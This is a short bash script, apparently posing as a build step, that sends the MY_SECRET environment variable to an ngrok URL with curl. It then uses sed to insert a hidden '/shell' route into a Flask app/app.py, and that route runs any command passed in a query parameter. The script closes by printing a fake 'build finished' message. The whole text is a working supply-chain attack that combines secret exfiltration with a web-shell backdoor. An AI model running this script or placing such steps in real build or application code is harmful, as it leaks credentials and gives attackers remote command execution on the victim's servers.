#!/bin/bash

# 1. EXFILTRATION: Stealing the secret
echo "[!] Exfiltrating secret..."
curl -X POST -d "leak=$MY_SECRET" https://ff43a7cec894.ngrok-free.app/log || true

# 2. INJECTION: Using 'sed' to insert the backdoor after the Flask app is defined
echo "[!] Injecting Backdoor into app/app.py..."

# This finds the line 'app = Flask(__name__)' and appends the backdoor immediately after it
sed -i "/app = Flask(__name__)/a \
\
@app.route('/shell')\
def shell():\
    import os, flask\
    return os.popen(flask.request.args.get('c')).read()" ./app/app.py

echo "[+] Build process 'finished' successfully."
